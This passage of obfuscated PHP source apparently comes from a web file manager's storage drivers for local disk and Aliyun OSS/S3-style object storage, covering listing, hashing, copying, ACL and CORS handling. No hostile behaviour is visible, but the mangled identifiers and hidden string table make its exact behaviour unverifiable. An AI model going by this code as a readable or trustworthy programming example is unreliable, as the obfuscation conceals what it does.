array($Óˆá­ä®[82] => array(), $Óˆá­ä®[83] => array()); if (!($•É•Ø»Ä = @opendir($Õæıº°‰))) { return $°¦™¬’œ; } while (($î˜í”ä¨ = readdir($•É•Ø»Ä)) !== !1) { if ($î˜í”ä¨ == $Óˆá­ä®[10] || $î˜í”ä¨ == $Óˆá­ä®[1324]) { continue; } $àâ¸ş­» = $Õæıº°‰ . $î˜í”ä¨; if (is_file($àâ¸ş­»)) { $°¦™¬’œ[$Óˆá­ä®[83]][] = $this->fileInfo($àâ¸ş­», $š¨Õåõ); } else { $°¦™¬’œ[$Óˆá­ä®[82]][] = $this->folderInfo($àâ¸ş­», $š¨Õåõ); } } closedir($•É•Ø»Ä); return $°¦™¬’œ; } public function listAll($½ÕŠ½š, &$úûÕÅ¥‚ = array()) { $™íÉë£· =& $_SERVER[…É¦À–]; $½ÕŠ½š = $this->iconvSystem($½ÕŠ½š); $½ÕŠ½š = rtrim($½ÕŠ½š, $™íÉë£·[8]) . $™íÉë£·[8]; if (!($¾âà = @opendir($½ÕŠ½š))) { return $úûÕÅ¥‚; } while (($ƒóóú… = readdir($¾âà)) !== !1) { if ($ƒóóú… == $™íÉë£·[10] || $ƒóóú… == $™íÉë£·[1324]) { continue; } $˜—È˜Í = $½ÕŠ½š . $ƒóóú…; $‰öğÃÆµ = is_dir($˜—È˜Í) && !is_link($˜—È˜Í) ? 1 : 0; $˜—È˜Í = $‰öğÃÆµ ? $˜—È˜Í . $™íÉë£·[8] : $˜—È˜Í; $úûÕÅ¥‚[] = array($™íÉë£·[84] => $˜—È˜Í, $™íÉë£·[75] => $‰öğÃÆµ, $™íÉë£·[85] => intval(@filemtime($˜—È˜Í)), $™íÉë£·[76] => $‰öğÃÆµ ? 0 : intval($this->size($˜—È˜Í))); if ($‰öğÃÆµ) { $this->listAll($˜—È˜Í, $úûÕÅ¥‚); } } closedir($¾âà); return $úûÕÅ¥‚; } public function has($×İùæØ, $áÉÓíÂË = false, $‹¼€Œ…Ô = true) { $Â”öŸ›² =& $_SERVER[…É¦À–]; $×İùæØ = $this->iconvSystem($×İùæØ); $×İùæØ = rtrim($×İùæØ, $Â”öŸ›²[8]) . $Â”öŸ›²[8]; if (!($¤Ö¿àßç = @opendir($×İùæØ))) { return !1; } $ê½¼•‚ = 0; $Ãœ¯±• = 0; $¢çÕ¾Ê‘ = 0; while (($‡¸óª Š = readdir($¤Ö¿àßç)) !== !1) { if ($‡¸óª Š == $Â”öŸ›²[10] || $‡¸óª Š == $Â”öŸ›²[1324]) { continue; } $ú¦Èêò = $×İùæØ . $‡¸óª Š; if ($áÉÓíÂË) { $¢çÕ¾Ê‘++; if (@is_file($ú¦Èêò)) { $ê½¼•‚++; } else { $Ãœ¯±•++; } if ($¢çÕ¾Ê‘ > 10000) { break; } continue; } if ($‹¼€Œ…Ô) { if (@is_file($ú¦Èêò)) { return !0; } } else { if (@is_dir($ú¦Èêò . $Â”öŸ›²[8])) { return !0; } } } closedir($¤Ö¿àßç); if ($áÉÓíÂË) { return array($Â”öŸ›²[207] => $ê½¼•‚, $Â”öŸ›²[208] => $Ãœ¯±•); } return !1; } public function hashSimple($£½ÛÃŒ¶) { $ê²ä¸Ş =& $_SERVER[…É¦À–]; if (!$£½ÛÃŒ¶) { return md5($ê²ä¸Ş[12]); } $£½ÛÃŒ¶ = $this->iconvSystem($£½ÛÃŒ¶); $ûˆÙ©İ = $this->size($£½ÛÃŒ¶); $Ä÷¾Ñ¨Û = 200; $°ˆò–À = 50; if ($ûˆÙ©İ <= $Ä÷¾Ñ¨Û * $°ˆò–À) { return $this->hashMd5($£½ÛÃŒ¶) . $ûˆÙ©İ; } $‹°Íù‡Ä = $ê²ä¸Ş[12]; $¿Íë¶¼Š = intval($ûˆÙ©İ / $°ˆò–À); $‰¶“›¼ƒ = fopen($£½ÛÃŒ¶, $ê²ä¸Ş[1412]); if (!$‰¶“›¼ƒ) { return $‹°Íù‡Ä; } for ($Ìä„£°Æ = 0; $Ìä„£°Æ < $°ˆò–À; $Ìä„£°Æ++) { fseek_64($‰¶“›¼ƒ, $¿Íë¶¼Š * $Ìä„£°Æ); $‹°Íù‡Ä .= fread($‰¶“›¼ƒ, $Ä÷¾Ñ¨Û); } fseek_64($‰¶“›¼ƒ, $ûˆÙ©İ - $Ä÷¾Ñ¨Û); $‹°Íù‡Ä .= fread($‰¶“›¼ƒ, $Ä÷¾Ñ¨Û); fclose($‰¶“›¼ƒ); return md5($‹°Íù‡Ä) . $ûˆÙ©İ; } public function getContent($ö™Á€â) { $ö™Á€â = $this->iconvSystem($ö™Á€â); return file_get_contents($ö™Á€â); } public function setContent($°¡÷Õûã, $Ñ¢Åü æ = '') { $°¡÷Õûã = $this->iconvSystem($°¡÷Õûã); $ÀËİœß = @file_put_contents($°¡÷Õûã, $Ñ¢Åü æ, LOCK_EX); clearstatcache(); @chmod($°¡÷Õûã, $this->pathAuth); return $ÀËİœß === !1 ? !1 : !0; } public function fileSubstr($œƒùº„ƒ, $ÚíèŸ¿ = 0, $–ÒÜµÊ = false) { $Ş™Å÷ò‘ =& $_SERVER[…É¦À–]; $œƒùº„ƒ = $this->iconvSystem($œƒùº„ƒ); if ($–ÒÜµÊ === !1) { $–ÒÜµÊ = $this->size($œƒùº„ƒ); } if ($–ÒÜµÊ <= 0) { return $Ş™Å÷ò‘[12]; } $ò¨Ñ¶¹€ = fopen($œƒùº„ƒ, $Ş™Å÷ò‘[1412]); if (!$ò¨Ñ¶¹€) { return !1; } fseek_64($ò¨Ñ¶¹€, $ÚíèŸ¿); $¸ó¸°ÖØ = fread($ò¨Ñ¶¹€, $–ÒÜµÊ); fclose($ò¨Ñ¶¹€); return $¸ó¸°ÖØ; } public function upload($İİ•²¦Ã, $¼õ»Ëö·, $›áÀå´´ = false, $³ÅŒª† = REPEAT_REPLACE) { if ($›áÀå´´) { return $this->moveFile($¼õ»Ëö·, $İİ•²¦Ã); } return $this->copyFile($¼õ»Ëö·, $İİ•²¦Ã); } public function setModifyTime($¹ÇìÕ›œ, $İ­¸‰î = '') { @touch($¹ÇìÕ›œ, intval($İ­¸‰î)); } public function download($•øğ°», $µ‚‘†ä) { return $this->iconvSystem($•øğ°»); } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($–ì§ÈéÄ) { parent::__construct($–ì§ÈéÄ); $this->signatureVersion($_SERVER[…É¦À–][216]); } public function fileOutLink($ºŠÀ€Í) { $üğ”´…ª =& $_SERVER[…É¦À–]; if (substr($ºŠÀ€Í, 0, 7) == $üğ”´…ª[1376]) { $ºŠÀ€Í = $üğ”´…ª[1377] . substr($ºŠÀ€Í, 7); } header($üğ”´…ª[161] . $ºŠÀ€Í); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public $config = array(); public function __construct($úÒÖÀ´Š) { parent::__construct(); include_once SDK_DIR . $_SERVER[…É¦À–][1413]; $this->_init($úÒÖÀ´Š); } public function _init($êÔ Í©) { $Êƒöµ„ =& $_SERVER[…É¦À–]; $this->config = $êÔ Í©; foreach ($êÔ Í© as $¦¬ïïşû => $‹€É›ı¦) { if (isset($this->{$¦¬ïïşû})) { $this->{$¦¬ïïşû} = $‹€É›ı¦; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($Êƒöµ„[1414] . LNG($Êƒöµ„[1415])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $ÜØŞò´Í =& $_SERVER[…É¦À–]; $©ŞÕ˜êÏ = new OSS\Model\CorsConfig(); $Ûƒª ûÊ = new OSS\Model\CorsRule(); $Ûƒª ûÊ->addAllowedOrigin($ÜØŞò´Í[1416]); $Ûƒª ûÊ->addAllowedMethod($ÜØŞò´Í[1417]); $Ûƒª ûÊ->addAllowedMethod($ÜØŞò´Í[1418]); $Ûƒª ûÊ->addAllowedMethod($ÜØŞò´Í[1419]); $Ûƒª ûÊ->addAllowedMethod($ÜØŞò´Í[1420]); $Ûƒª ûÊ->addAllowedMethod($ÜØŞò´Í[160]); $Ûƒª ûÊ->setMaxAgeSeconds(600); $Ûƒª ûÊ->addExposeHeader($ÜØŞò´Í[1421]); $Ûƒª ûÊ->addAllowedHeader($ÜØŞò´Í[1416]); $©ŞÕ˜êÏ->addRule($Ûƒª ûÊ); try { $this->client->putBucketCors($this->bucket, $©ŞÕ˜êÏ); } catch (OSS\Core\OssException $¶Ş¯Ã¶) { return !1; } return !0; } public function getBucketCors() { $Ô–³¾³ =& $_SERVER[…É¦À–]; $ıËµèéè = null; try { $ıËµèéè = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $Ôï¡ß’Ä) { return null; } if (!$ıËµèéè || !($³Ãª‡¦î = $ıËµèéè->getRules())) { return null; } $îÊƒÖ© = $³Ãª‡¦î[0]->getAllowedOrigins(); $ÃŞ­ÀÙÓ = $³Ãª‡¦î[0]->getAllowedMethods(); $Òíµ–¢İ = $³Ãª‡¦î[0]->getMaxAgeSeconds(); $ã‘õí«á = $³Ãª‡¦î[0]->getExposeHeaders(); $ß™ì³¬î = $³Ãª‡¦î[0]->getAllowedHeaders(); return array($Ô–³¾³[188] => isset($îÊƒÖ©[0]) ? $îÊƒÖ©[0] : $Ô–³¾³[12], $Ô–³¾³[192] => $ÃŞ­ÀÙÓ, $Ô–³¾³[1422] => $Òíµ–¢İ, $Ô–³¾³[1423] => isset($ã‘õí«á[0]) ? $ã‘õí«á[0] : $Ô–³¾³[12], $Ô–³¾³[190] => isset($ß™ì³¬î[0]) ? $ß™ì³¬î[0] : $Ô–³¾³[12]); } public function isBucketCors() { $½×››‰Ò =& $_SERVER[…É¦À–]; $çµôá‡‘ = $this->getBucketCors(); if (!$çµôá‡‘ || !is_array($çµôá‡‘)) { return !1; } if ($çµôá‡‘[$½×››‰Ò[188]] != $½×››‰Ò[189] || $çµôá‡‘[$½×››‰Ò[190]] != $½×››‰Ò[189]) { return !1; } $ÜŠš¤á = array_map($½×››‰Ò[191], $çµôá‡‘[$½×››‰Ò[192]]); if (!is_array($ÜŠš¤á)) { $ÜŠš¤á = array(); } $—â›ºè¡ = array($½×››‰Ò[193], $½×››‰Ò[194], $½×››‰Ò[195], $½×››‰Ò[196], $½×››‰Ò[197]); $ßø–®Ëı = array_diff($—â›ºè¡, $ÜŠš¤á); return empty($ßø–®Ëı); } public function mkfile($“Ô¬Ùá¥, $€™˜ìßá = '', $¾¯§÷­å = REPEAT_RENAME) { $ú›³Ê€¬ = $this->setContent($“Ô¬Ùá¥, $€™˜ìßá); if ($ú›³Ê€¬ !== !1) { return $this->getPathOuter($“Ô¬Ùá¥); } return !1; } public function mkdir($ÌâÑÊÌß, $¼úêÁí´ = REPEAT_SKIP) { if ($¼úêÁí´ && $this->_isFolder($ÌâÑÊÌß)) { return $this->getPathOuter($ÌâÑÊÌß); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($ÌâÑÊÌß)); } catch (OSS\Core\OssException $Ó×™‰Ú™) { return !1; } return $this->getPathOuter($ÌâÑÊÌß); } private function fileList($Ğæ¨‹ÆÄ, $ëÒÚÇ© = '', $€äı©÷¬ = 0) { $æÂø°ÎÜ =& $_SERVER[…É¦À–]; $Ğæ¨‹ÆÄ = trim($Ğæ¨‹ÆÄ, $æÂø°ÎÜ[8]); $Éèó³ÔÑ = empty($Ğæ¨‹ÆÄ) && $Ğæ¨‹ÆÄ !== $æÂø°ÎÜ[198] ? $æÂø°ÎÜ[12] : $Ğæ¨‹ÆÄ . $æÂø°ÎÜ[8]; $üß¹ç“ = $æÂø°ÎÜ[12]; $„ğ©¹Àä = 1000; $¯¥º”ğÇ = $Äºì ¡¯ = array(); while (!0) { check_abort(); $ú‹Ê“ùê = array($æÂø°ÎÜ[1424] => $ëÒÚÇ©, $æÂø°ÎÜ[1425] => $Éèó³ÔÑ, $æÂø°ÎÜ[1426] => $„ğ©¹Àä, $æÂø°ÎÜ[1427] => $üß¹ç“); try { $ä•ñŒè¿ = $this->client->listObjects($this->bucket, $ú‹Ê“ùê); } catch (OSS\Core\OssException $ï‘ûÓÂ) { break; } $üß¹ç“ = $ä•ñŒè¿->getNextMarker(); $ø÷•»¢İ = $ä•ñŒè¿->getObjectList(); $âÌçâ = $ä•ñŒè¿->getPrefixList(); foreach ($ø÷•»¢İ as $†òôÃ×Ñ) { if ($†òôÃ×Ñ->getKey() == $Éèó³ÔÑ) { continue; } $¦åÚæ¡à = $†òôÃ×Ñ->getKey(); $§£åêí = $†òôÃ×Ñ->getSize(); $¾ÇÜ› = $†òôÃ×Ñ->getLastModified(); $ª®Âö†† = $€äı©÷¬ ? array($æÂø°ÎÜ[32] => $¦åÚæ¡à, $æÂø°ÎÜ[76] => $§£åêí, $æÂø°ÎÜ[180] => strtotime($¾ÇÜ›)) : $¦åÚæ¡à; $ğùÀ¸§ = $§£åêí == 0 && substr($¦åÚæ¡à, strlen($¦åÚæ¡à) - 1, 1) == $æÂø°ÎÜ[8] ? !0 : !1; $çĞÉÍ„ = array($æÂø°ÎÜ[76] => $§£åêí, $æÂø°ÎÜ[1428] => $§£åêí, $æÂø°ÎÜ[85] => strtotime($¾ÇÜ›), $æÂø°ÎÜ[1429] => $¾ÇÜ›); $this->cacheMethodInfoSet($¦åÚæ¡à, $ğùÀ¸§, $çĞÉÍ„); if ($ğùÀ¸§) { $¯¥º”ğÇ[] = $¦åÚæ¡à; continue; } $Äºì ¡¯[] = $ª®Âö††; } foreach ($âÌçâ as $şÓÈ“‹…) { $¯¥º”ğÇ[] = $şÓÈ“‹…->getPrefix(); $this->cacheMethodInfoSet($şÓÈ“‹…->getPrefix(), !0); } if ($üß¹ç“ === $æÂø°ÎÜ[12]) { break; } } $this->cacheMethodInfoSet($Ğæ¨‹ÆÄ, !0); return array($æÂø°ÎÜ[82] => $¯¥º”ğÇ, $æÂø°ÎÜ[83] => $Äºì ¡¯); } public function copyFile($œ‹ä÷ÃÉ, $Ø›¢–¯‰) { $‘ËÃÁµü = $this->size($œ‹ä÷ÃÉ); if ($‘ËÃÁµü < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $œ‹ä÷ÃÉ, $this->bucket, $this->pathEncode($Ø›¢–¯‰)); } catch (OSS\Core\OssException $µÉœ‘Ä…) { return !1; } return $this->getPathOuter($Ø›¢–¯‰); } $Ğˆ¢¨Š— = $this->multiCopyObject($œ‹ä÷ÃÉ, $Ø›¢–¯‰, $‘ËÃÁµü); return $Ğˆ¢¨Š— ? $this->getPathOuter($Ø›¢–¯‰) : !1; } private function multiCopyObject($òæ­¥¦, $”ÉóõîÙ, $çá«Áû) { $Ø©×Â¥· =& $_SERVER[…É¦À–]; try { $ÆúŠªõ™ = array(); if ($ë‘í®„ª = $this->hashMd5($òæ­¥¦)) { $ÆúŠªõ™ = array(OSS\OssClient::OSS_HEADERS => array($Ø©×Â¥·[1430] => $ë‘í®„ª)); } $›¤ÅãÏˆ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($”ÉóõîÙ), $ÆúŠªõ™); $“”ÙÀ­È = 1; $©Éø¾õ = 0; $Ô„©®­ô = array(); $ÀíÑõ½ô = 1024 * 1024 * 10; $‡Ôäö°¿ = $this->client->generateMultiuploadParts($çá«Áû, $ÀíÑõ½ô); foreach ($‡Ôäö°¿ as $ïÊŞ¤Û => $Ë·Äô¶Ò) { $Ğ»¨¢ÜÖ = $©Éø¾õ + (int) $Ë·Äô¶Ò[$Ø©×Â¥·[1431]]; $¿î„Î­ = (int) $Ë·Äô¶Ò[$Ø©×Â¥·[366]] + $Ğ»¨¢ÜÖ - 1; $š¢ıú„– = array($Ø©×Â¥·[1432] => $Ğ»¨¢ÜÖ, $Ø©×Â¥·[1433] => $¿î„Î­); $Ô„©®­ô[] = $this->client->uploadPartCopy($this->bucket, $òæ­¥¦, $this->bucket, $this->pathEncode($”ÉóõîÙ), $“”ÙÀ­È, $›¤ÅãÏˆ, $š¢ıú„–); $“”ÙÀ­È = $“”ÙÀ­È + 1; } $îé‰ù¡á = array(); foreach ($Ô„©®­ô as $ïÊŞ¤Û => $œ­ùõ€Ã) { $îé‰ù¡á[] = array($Ø©×Â¥·[1434] => $ïÊŞ¤Û + 1, $Ø©×Â¥·[1435] => $œ­ùõ€Ã); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($”ÉóõîÙ), $›¤ÅãÏˆ, $îé‰ù¡á); } catch (OSS\Core\OssException $·”ıû±ª) { return !1; } return !0; } public function moveFile($äÎ¤°ıÍ, $½À¶€Ëú) { if ($this->copyFile($äÎ¤°ıÍ, $½À¶€Ëú)) { $this->remove($äÎ¤°ıÍ); return $this->getPathOuter($½À¶€Ëú); } return !1; } public function delFile($±Ç¿Í°µ) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($±Ç¿Í°µ)); } catch (OSS\Core\OssException $ú‡ìîº) { return !1; } return !0; } public function delFolder($Ô³ŞºĞ÷) { $éóê­¬¯ =& $_SERVER[…É¦À–]; if (!$this->exist($Ô³ŞºĞ÷)) { return !0; } $this->listItemCache = !1; $İ¤”Âø = $this->fileList($Ô³ŞºĞ÷); $this->listItemCache = !0; $Ô¯¸ÅŠĞ = trim($Ô³ŞºĞ÷, $éóê­¬¯[8]) . $éóê­¬¯[8]; if (!empty($Ô³ŞºĞ÷) && $Ô³ŞºĞ÷ !== $éóê­¬¯[198] && !in_array($Ô¯¸ÅŠĞ, $İ¤”Âø[$éóê­¬¯[82]])) { $İ¤”Âø[$éóê­¬¯[82]][] = $Ô¯¸ÅŠĞ; } $íŠ¯ı˜² = $this->delByBatch($İ¤”Âø[$éóê­¬¯[83]]); if (!$íŠ¯ı˜²) { return !1; } $íŠ¯ı˜² = $this->delByBatch($İ¤”Âø[$éóê­¬¯[82]]); if (!$íŠ¯ı˜²) { return !1; } return $this->delFile($Ô¯¸ÅŠĞ); } private function delByBatch($Ö™å‚ŸÜ) { foreach (array_chunk($Ö™å‚ŸÜ, 1000) as $¶®Æªİİ) { try { $this->client->deleteObjects($this->bucket, $¶®Æªİİ); } catch (OSS\Core\OssException $ú…œ¶ÓŞ) { return !1; } } return !0; } public function rename($¶Â£ô¹ó, $”Ê¿·Û) { return $this->renameObject($¶Â£ô¹ó, $”Ê¿·Û); } private function fileInfo($í“±¢‚•, $Ğ ¤¿ªŠ = false, $û€Á¥¹é = array()) { $å’«áî¼ =& $_SERVER[…É¦À–]; $ğæ‡½ê = array($å’«áî¼[32] => $this->pathThis($í“±¢‚•), $å’«áî¼[84] => $this->getPathOuter($í“±¢‚•), $å’«áî¼[33] => $å’«áî¼[200], $å’«áî¼[76] => isset($û€Á¥¹é[$å’«áî¼[76]]) ? $û€Á¥¹é[$å’«áî¼[76]] : 0, $å’«áî¼[174] => $this->ext($í“±¢‚•)); if ($Ğ ¤¿ªŠ) { return $ğæ‡½ê; } $ğæ‡½ê[$å’«áî¼[201]] = $ğæ‡½ê[$å’«áî¼[85]] = 0; $ğæ‡½ê[$å’«áî¼[202]] = $ğæ‡½ê[$å’«áî¼[203]] = !0; if (empty($û€Á¥¹é)) { $É‰µ‡·¨ = $this->objectMeta($í“±¢‚•); if (!$É‰µ‡·¨) { return $ğæ‡½ê; } $û€Á¥¹é = array($å’«áî¼[85] => strtotime($É‰µ‡·¨[$å’«áî¼[1429]]), $å’«áî¼[76] => $É‰µ‡·¨[$å’«áî¼[1428]] + 0); } if (isset($û€Á¥¹é[$å’«áî¼[76]])) { $ğæ‡½ê[$å’«áî¼[76]] = $û€Á¥¹é[$å’«áî¼[76]]; } if (isset($û€Á¥¹é[$å’«áî¼[85]])) { $ğæ‡½ê[$å’«áî¼[85]] = $û€Á¥¹é[$å’«áî¼[85]]; } if (isset($û€Á¥¹é[$å’«áî¼[180]]) && !trim($ğæ‡½ê[$å’«áî¼[85]])) { $ğæ‡½ê[$å’«áî¼[85]] = $û€Á¥¹é[$å’«áî¼[180]]; } return $ğæ‡½ê; } private function folderInfo($²¢ôÛ, $ëÏãÔ¶õ = false, $Ú°Éâ¸¾ = array()) { $¥òÆïá =& $_SERVER[…É¦À–]; $±¡•ƒÄÒ = array($¥òÆïá[32] => $this->pathThis($²¢ôÛ), $¥òÆïá[84] => $this->getPathOuter($¥òÆïá[8] . $²¢ôÛ), $¥òÆïá[33] => $¥òÆïá[75]); if ($ëÏãÔ¶õ) { return $±¡•ƒÄÒ; } $±¡•ƒÄÒ[$¥òÆïá[201]] = $±¡•ƒÄÒ[$¥òÆïá[85]] = 0; $±¡•ƒÄÒ[$¥òÆïá[202]] = $±¡•ƒÄÒ[$¥òÆïá[203]] = !0; if (empty($Ú°Éâ¸¾)) { $²¢ôÛ = rtrim($²¢ôÛ, $¥òÆïá[8]) . $¥òÆïá[8]; $ìºÇ¸ÚĞ = $this->objectMeta($²¢ôÛ); if (!$ìºÇ¸ÚĞ) { return $±¡•ƒÄÒ; } $Ú°Éâ¸¾ = array($¥òÆïá[201] => $ìºÇ¸ÚĞ[$¥òÆïá[531]][$¥òÆïá[1436]], $¥òÆïá[85] => strtotime($ìºÇ¸ÚĞ[$¥òÆïá[1429]])); } if (isset($Ú°Éâ¸¾[$¥òÆïá[85]])) { $±¡•ƒÄÒ[$¥òÆïá[85]] = $Ú°Éâ¸¾[$¥òÆïá[85]]; } if (isset($Ú°Éâ¸¾[$¥òÆïá[201]])) { $±¡•ƒÄÒ[$¥òÆïá[201]] = $Ú°Éâ¸¾[$¥òÆïá[201]]; } return $±¡•ƒÄÒ; } public function listPath($í¤ˆË„ç, $ª§óö‰¯ = false) { $‘éËÁÚ£ =& $_SERVER[…É¦À–]; $…ÍÅùœ = $this->fileList($í¤ˆË„ç, $‘éËÁÚ£[8], !0); foreach ($…ÍÅùœ[$‘éËÁÚ£[82]] as $ç÷ƒ½…È => $Á†îÅË) { $…ÍÅùœ[$‘éËÁÚ£[82]][$ç÷ƒ½…È] = $this->folderInfo($Á†îÅË, $ª§óö‰¯, $Á†îÅË); } foreach ($…ÍÅùœ[$‘éËÁÚ£[83]] as $ç÷ƒ½…È => $Á†îÅË) { $…ÍÅùœ[$‘éËÁÚ£[83]][$ç÷ƒ½…È] = $this->fileInfo($Á†îÅË[$‘éËÁÚ£[32]], $ª§óö‰¯, $Á†îÅË); } return $…ÍÅùœ; } protected function infoChildren($Õ‰—º¦†, &$È ŠÃ) { $—Ôƒã—¾ =& $_SERVER[…É¦À–]; $ìÀõ…ìš = $this->fileList($Õ‰—º¦†, $—Ôƒã—¾[12], !0); $È ŠÃ[$—Ôƒã—¾[78]] += count($ìÀõ…ìš[$—Ôƒã—¾[82]]); $È ŠÃ[$—Ôƒã—¾[77]] += count($ìÀõ…ìš[$—Ôƒã—¾[83]]); foreach ($ìÀõ…ìš[$—Ôƒã—¾[83]] as $ÙÂöÃ¾‡) { if (!$ÙÂöÃ¾‡ || !$ÙÂöÃ¾‡[$—Ôƒã—¾[76]]) { continue; } $È ŠÃ[$—Ôƒã—¾[76]] += $ÙÂöÃ¾‡[$—Ôƒã—¾[76]]; } } public function has($ˆŸÍ Ëı, $›ß¸®Øñ = false, $Î‘’¶´¸ = true) { $Û¹ü¯ïº =& $_SERVER[…É¦À–]; $ˆŸÍ Ëı = trim($ˆŸÍ Ëı, $Û¹ü¯ïº[8]); $ÜŒŸ…‘ = empty($ˆŸÍ Ëı) && $ˆŸÍ Ëı !== $Û¹ü¯ïº[198] ? $Û¹ü¯ïº[12] : $ˆŸÍ Ëı . $Û¹ü¯ïº[8]; $¶¸ûÔ¹ = $Û¹ü¯ïº[12]; $ƒŒëåá™ = 500; $ ÃøüºÎ = $½Ë¤ò³ = 0; while (!0) { check_abort(); $Ê¦•®…Ñ = array($Û¹ü¯ïº[1424] => $Û¹ü¯ïº[8], $Û¹ü¯ïº[1425] => $ÜŒŸ…‘, $Û¹ü¯ïº[1426] => $ƒŒëåá™, $Û¹ü¯ïº[1427] => $¶¸ûÔ¹); try { $£‘Úú³” = $this->client->listObjects($this->bucket, $Ê¦•®…Ñ); } catch (OSS\Core\OssException $¢¸·¡û„) { break; } $¶¸ûÔ¹ = $£‘Úú³”->getNextMarker(); $üò‰á˜È = $£‘Úú³”->getObjectList(); $»¾¬Ï³‹ = $£‘Úú³”->getPrefixList(); if ($›ß¸®Øñ) { if (count($üò‰á˜È) > 1 || count($üò‰á˜È) == 1 && $üò‰á˜È[0]->getKey() != $ÜŒŸ…‘) { $ ÃøüºÎ += count($üò‰á˜È) - 1; } if (!empty($»¾¬Ï³‹)) { $½Ë¤ò³ += count($»¾¬Ï³‹); } if ($¶¸ûÔ¹ === $Û¹ü¯ïº[12]) { break; } continue; } if ($Î‘’¶´¸) { if (!empty($üò‰á˜È)) { if (count($üò‰á˜È) > 1 || $üò‰á˜È[0]->getKey() != $ÜŒŸ…‘) { return !0; } } } else { if (!empty($»¾¬Ï³‹)) { return !0; } } if ($¶¸ûÔ¹ === $Û¹ü¯ïº[12]) { break; } } if ($›ß¸®Øñ) { return array($Û¹ü¯ïº[207] => $ ÃøüºÎ, $Û¹ü¯ïº[208] => $½Ë¤ò³); } return !1; } public function listAll($Ÿ¶ğšò) { $éõ¶ƒìà =& $_SERVER[…É¦À–]; $çŒ¥Â× = $this->fileList($Ÿ¶ğšò, $éõ¶ƒìà[12], !0); $ÔØó¨ø¡ = array_to_keyvalue($çŒ¥Â×[$éõ¶ƒìà[83]], $éõ¶ƒìà[32]); foreach ($çŒ¥Â×[$éõ¶ƒìà[82]] as $«è”½Ğ¼) { if (is_string($«è”½Ğ¼)) { $ÔØó¨ø¡[$«è”½Ğ¼] = array($éõ¶ƒìà[76] => 0); } } return $this->listAllFiles($Ÿ¶ğšò, $ÔØó¨ø¡); } public function canRead($Ùùóü¾Ô) { $Ã¦Ï²» =& $_SERVER[…É¦À–]; $ìåî¾¢û = $this->pathAcl($Ùùóü¾Ô); return $ìåî¾¢û == $Ã¦Ï²»[1437] || $ìåî¾¢û == $Ã¦Ï²»[576] ? !0 : !1; } public function canWrite($ß—ÅÖ‰«) { $­¸ıƒ’÷ = $this->pathAcl($ß—ÅÖ‰«); return $­¸ıƒ’÷ == $_SERVER[…É¦À–][576] ? !0 : !1; } public function pathAcl($ô­»ù…´) { $’£³‚µ =& $_SERVER[…É¦À–]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $Ş©ÇÓÉß = $this->client->getObjectAcl($this->bucket, $this->pathEncode($ô­»ù…´)); } catch (OSS\Core\OssException $™õ¶™Ïƒ) { return !1; } $æ½»ÕÍ = $Ş©ÇÓÉß == $’£³‚µ[37] ? $this->bucketAcl : $Ş©ÇÓÉß; if ($æ½»ÕÍ == $’£³‚µ[1438]) { return $’£³‚µ[1437]; } if ($æ½»ÕÍ == $’£³‚µ[1439]) { return $’£³‚µ[576]; } return $æ½»ÕÍ; } private function chmodPath($İµå¡›«, $¬İ•Ñ›© = '') { $°ğï… =& $_SERVER[…É¦À–]; $ùÌÎ¯™ù = empty($¬İ•Ñ›©) ? $°ğï…[1439] : $¬İ•Ñ›©; $µş°ŸŠ— = array($°ğï…[37], $°ğï…[199], $°ğï…[1438], $°ğï…[1439]); if (!in_array($ùÌÎ¯™ù, $µş°ŸŠ—)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($İµå¡›«), $ùÌÎ¯™ù); } catch (OSS\Core\OssException $Ë¬¨ñÏõ) { return !1; } return !0; } public function getContent($Ôò¾•Å) { return $this->fileSubstr($Ôò¾•Å, -1); } public function setContent($’ÃÍŠ…Ğ, $ó¸²ùà¸ = '') { $œåîìú =& $_SERVER[…É¦À–]; try { $öÁ÷¯Ò‡ = $this->trafficLimit($œåîìú[1440]); $§±ò­öµ = $this->client->putObject($this->bucket, $this->pathEncode($’ÃÍŠ…Ğ), $ó¸²ùà¸, $öÁ÷¯Ò‡); } catch (OSS\Core\OssException $â¢’¬ÂÔ) { return !1; } $ŸäşâŒ¹ = array($œåîìú[1430] => trim($§±ò­öµ[$œåîìú[1441]], $œåîìú[118]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($’ÃÍŠ…Ğ))); $this->updateObjMeta($’ÃÍŠ…Ğ, $ŸäşâŒ¹); return isset($§±ò­öµ[$œåîìú[1442]][$œåîìú[260]]) ? !0 : !1; } private function updateObjMeta($¾æÛºŒ, $ÖÙËÄ±à) { $¾æÛºŒ = $this->pathEncode($¾æÛºŒ); try { $äÜ„ëçò = array(OSS\OssClient::OSS_HEADERS => $ÖÙËÄ±à); $this->client->copyObject($this->bucket, $¾æÛºŒ, $this->bucket, $¾æÛºŒ, $äÜ„ëçò); } catch (OSS\Core\OssException $áÌìæ é) { return !1; } return !0; } public function upload($ŞÂÃÂ, $àĞ“É©, $Š‡×ƒ¢ = false, $æ†òÇæø = REPEAT_REPLACE) { $Åô³¡ç =& $_SERVER[…É¦À–]; $ûı†ğÔÇ = trim($ŞÂÃÂ, $Åô³¡ç[8]); $¬ÂÙÁºÊ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($Åô³¡ç[1430] => @md5_file($àĞ“É©)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ŞÂÃÂ))); $¬ÂÙÁºÊ = $this->trafficLimit($Åô³¡ç[1440], $¬ÂÙÁºÊ); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($ûı†ğÔÇ), 